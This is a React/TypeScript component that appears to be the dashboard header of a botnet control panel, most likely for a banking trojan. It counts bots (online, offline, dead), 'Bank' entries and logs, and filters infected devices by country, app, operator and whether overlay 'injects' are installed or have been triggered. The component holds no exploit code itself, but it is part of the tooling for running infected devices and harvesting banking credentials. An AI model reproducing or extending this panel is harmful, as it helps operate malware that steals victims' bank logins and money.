import { useContext, useEffect } from 'react';
import { Input, Checkbox, Tag, Affix } from 'antd';
import { BotContext } from './providers';
import { BotStateType } from '../../common/DataType';
import { getMainStats } from './services';

export default () => {
  const { state, setState } = useContext(BotContext)

  useEffect(() => {
    getMainStats().then((res) => {
      setState((state: BotStateType) => {
        return {
          ...state,
          stats: res
        }
      })
    })
  }, [state.table.rows])

  return (
    <div className='mb-4 mt-4 text-center w-[600px] m-auto'>
      <Affix offsetTop={20}>
      <div className='mb-2 m-auto'>
        <Tag className='w-16' color='cyan'>Bots {state.stats.bots}</Tag>
        <Tag className='w-16' color='success'>Online {state.stats.online}</Tag>
        <Tag className='w-16' color='volcano'>Offline {state.stats.offline}</Tag>
        <Tag className='w-16' color='warning'>Dead {state.stats.dead}</Tag>
        <Tag className='w-16' color='lime'>Bank {state.stats.banks}</Tag>
        <Tag className='w-16' color='magenta'>Log {state.stats.log}</Tag>
      </div>
      </Affix>
      <div className='flex'>
        <Input placeholder='ID' className='!mb-2 !mr-1' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, botId: e.target.value } }))} />
        <Input placeholder='Country Code' className='!mb-2 !mr-1' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, country: e.target.value } }))} />
        <Input placeholder='App' className='!mb-2 !mr-1' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, app: e.target.value } }))} />
        <Input placeholder='Operator' className='!mb-2 !mr-2' onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, operator: e.target.value } }))} />
      </div>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, online: e.target.checked } }))}>Online</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, offline: e.target.checked } }))}>Offline</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, dead: e.target.checked } }))}>Dead</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, hasInjects: e.target.checked } }))}>Has Injects</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, hasNotInjects: e.target.checked } }))}>Has not injects</Checkbox>
      <Checkbox onChange={(e: any) => setState((state: BotStateType) => ({ ...state, table: {...state.table, page: 1}, search: { ...state.search, triggeredInject: e.target.checked } }))}>Triggered inject</Checkbox>
    </div>
  )
}